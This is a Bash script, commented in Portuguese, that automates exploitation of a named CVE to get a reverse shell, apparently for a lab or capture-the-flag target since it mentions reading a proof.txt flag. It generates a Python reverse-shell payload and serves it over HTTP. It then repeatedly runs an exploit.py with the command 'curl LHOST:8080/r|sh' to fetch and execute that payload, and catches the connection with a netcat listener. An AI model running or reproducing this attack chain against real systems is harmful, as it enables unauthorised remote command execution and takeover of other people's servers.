#!/bin/bash
# run_shell.sh — CVE-2026-109618 → Reverse Shell automatizado
#
# Uso:
#   ./run_shell.sh                    → usa $IP ou 192.168.127.10
#   ./run_shell.sh <target> [porta]   → target e porta específicos
#
# Requisitos: exploit.py no mesmo diretório, python3, nc
#
# O script faz tudo sozinho:
#   1. Detecta o IP do Kali
#   2. Gera payload de reverse shell
#   3. Sobe HTTP server para servir o payload
#   4. Abre nc listener (foreground) — aguarda a conexão
#   5. Roda o exploit em loop em background até ter sucesso
#   6. Quando o exploit acerta, o shell aparece no terminal

set -u

TARGET="${1:-${IP:-192.168.127.10}}"
TPORT="${2:-80}"
LPORT=4444
SPORT=8080
MAX_ATTEMPTS=30

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT="$SCRIPT_DIR/exploit.py"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ─── Verificações ────────────────────────────────────────────
if [ ! -f "$EXPLOIT" ]; then
    echo -e "${RED}[!] exploit.py não encontrado em $SCRIPT_DIR${NC}"
    exit 1
fi

if ! command -v nc &>/dev/null; then
    echo -e "${RED}[!] nc (netcat) não instalado${NC}"
    exit 1
fi

# ─── Detecta IP do Kali ─────────────────────────────────────
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        echo "")

if [ -z "$LHOST" ]; then
    echo -e "${RED}[!] Não consegui detectar IP do Kali (tun0/eth0)${NC}"
    exit 1
fi

# ─── Verifica target acessível ───────────────────────────────
echo -e "${CYAN}[*]${NC} Testando conexão com $TARGET:$TPORT..."
if ! curl -s --max-time 5 -o /dev/null "http://$TARGET:$TPORT/"; then
    echo -e "${RED}[!] Target $TARGET:$TPORT inacessível${NC}"
    exit 1
fi
echo -e "${GREEN}[+]${NC} Target acessível"

# ─── Setup temporário ────────────────────────────────────────
TMP=$(mktemp -d)
cleanup() {
    kill $(jobs -p) 2>/dev/null
    wait 2>/dev/null
    rm -rf "$TMP"
}
trap cleanup EXIT

# ─── Gera payload de reverse shell ───────────────────────────
cat > "$TMP/r" << PAYLOAD
python3 -c "
import socket,subprocess,os
s=socket.socket()
s.connect(('$LHOST',$LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"
PAYLOAD

# ─── Sobe HTTP server (silencioso, com log) ──────────────────
(cd "$TMP" && python3 -m http.server "$SPORT") > "$TMP/http.log" 2>&1 &
HTTP_PID=$!
sleep 1

if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    echo -e "${RED}[!] Falha ao subir HTTP server na porta $SPORT${NC}"
    exit 1
fi

# ─── Banner ──────────────────────────────────────────────────
RCE_CMD="curl $LHOST:$SPORT/r|sh"
RCE_LEN=${#RCE_CMD}

echo ""
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  CVE-2026-109618 → Reverse Shell${NC}"
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Target:    ${BOLD}$TARGET:$TPORT${NC}"
echo -e "  Callback:  ${BOLD}$LHOST:$LPORT${NC}"
echo -e "  Payload:   ${BOLD}$RCE_CMD${NC} ($RCE_LEN bytes / 48 max)"
echo ""

if [ "$RCE_LEN" -gt 48 ]; then
    echo -e "${RED}[!] Payload excede 48 bytes! Ajuste IP/porta.${NC}"
    exit 1
fi

# ─── Exploit loop em BACKGROUND ──────────────────────────────
echo -e "${YELLOW}[*]${NC} Exploit rodando em background (até $MAX_ATTEMPTS tentativas)"
echo -e "${YELLOW}[*]${NC} Aguardando reverse shell..."
echo ""
echo -e "  Comandos úteis quando o shell conectar:"
echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
echo -e "    ${BOLD}id${NC}                       → uid/gid"
echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
echo ""

(
    for i in $(seq 1 $MAX_ATTEMPTS); do
        python3 "$EXPLOIT" \
            --host "$TARGET" --port "$TPORT" \
            --rce "$RCE_CMD" \
            &> "$TMP/exploit_$i.log"

        # Se o HTTP server recebeu GET /r, o exploit deu certo — para
        if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
            break
        fi

        sleep 3
    done
) &
EXPLOIT_PID=$!

# ─── nc listener em FOREGROUND — já escutando quando o exploit rodar ──
nc -lvnp $LPORT

echo ""
echo -e "${CYAN}[*]${NC} Shell encerrado."
